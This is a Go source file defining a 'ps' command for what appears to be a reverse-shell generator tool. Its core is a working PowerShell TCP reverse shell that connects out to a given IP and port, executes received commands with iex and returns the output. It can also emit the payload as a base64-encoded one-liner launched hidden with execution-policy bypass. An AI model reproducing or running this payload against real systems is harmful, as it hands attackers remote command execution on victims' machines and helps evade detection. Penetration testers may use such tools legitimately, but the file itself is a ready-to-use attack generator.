package cmd

import (
	"fmt"

	"github.com/secopsbear/sb-shells/colors"
	utffileconv "github.com/secopsbear/sb-shells/utfFileConv"
	"github.com/spf13/cobra"
)

var (
	generateEncodeOutput bool
)

// psCmd represents the ps command
var psCmd = &cobra.Command{
	Use:   "ps",
	Short: "Generate powershell reverse shell scripts",
	Long:  `Generate powershell reverse shell scripts.`,
	Run: func(cmd *cobra.Command, args []string) {

		// Validate Ip address and ports
		validateIpAndPorts(cmd, args)

		strDataB := `$client = New-Object System.Net.Sockets.TCPClient('` + ipAddressLocal + `', ` + portLocal + `);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'Cybo-PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

		if !generateEncodeOutput {

			err := utffileconv.CreateFile(outputFile, strDataB)
			if err != nil {
				fmt.Errorf("Can't open file. %v", err)
				return
			}
			fmt.Println("Generate output file: " + outputFile)

		}

		if generateEncodeOutput {
			fmt.Println(colors.BlueColor("Generate encoded output"))
			fmt.Println(colors.BlueColor("IP address: ") + ipAddressLocal + colors.BlueColor(" Port: ") + portLocal)

			psShellCode := convertUTF8toUTF16leToBase64(strDataB)

			fmt.Println(psShellCode)

		}
	},
}

func init() {
	rootCmd.AddCommand(psCmd)
	psCmd.PersistentFlags().BoolVarP(&generateEncodeOutput, "encoded", "e", false, "Generate Base64 Encoded Powershell output")
	psCmd.PersistentFlags().StringVarP(&outputFile, "outFile", "o", "cyboShell.ps1", "Generate output file")

}

// This function will receive UTF-8 string and returns UTF16LE formatted and converted to Base64 string with powershell command appended
func convertUTF8toUTF16leToBase64(message string) string {

	finalCmd := `powershell.exe -nop -W hidden -noni -ep bypass -e `

	bytesToConv := utffileconv.ConvertUTF8toUTF16LE(message)
	base64Str := utffileconv.ConvertBytesToBase64(bytesToConv)

	return finalCmd + base64Str
}
